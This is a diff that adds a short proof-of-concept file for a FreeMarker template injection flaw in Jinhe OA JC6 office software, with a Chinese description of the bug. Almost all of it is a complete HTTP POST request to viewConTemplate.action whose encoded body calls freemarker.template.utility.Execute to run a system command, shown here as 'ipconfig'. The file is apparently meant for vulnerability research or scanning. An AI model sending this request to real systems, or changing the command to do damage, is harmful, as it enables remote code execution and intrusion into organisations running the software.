@@ -1,0 +1,11 @@
+# 金和OA jc6 viewConTemplate.action FreeMarker模板注入漏洞
+# 金和OA是一款企业级办公自动化软件,旨在提供高效的办公流程管理和协作解决方案。金和OA JC6存在模板注入漏洞，攻击者可利用该漏洞执行恶意代码。
+POST /jc6/platform/portalwb/portalwb-con-template!viewConTemplate.action?acid=80051415&bid=hd_tag_m8mv23qc HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv23qc
+RM-PRO-Token: 9bc7e71be74bace51e63ecea89fd8982
+RM-PRO-Time: 1742808336593
+User-Agent: curl/7.83.1
+Content-Type: application/x-www-form-urlencoded
+
+moduId=1&code=%253Cclob%253E%2524%257B%2522freemarker.template.utility.Execute%2522%253Fnew%28%29%28%2522ipconfig%2522%29%257D%253C%252Fclob%253E&uuid=1
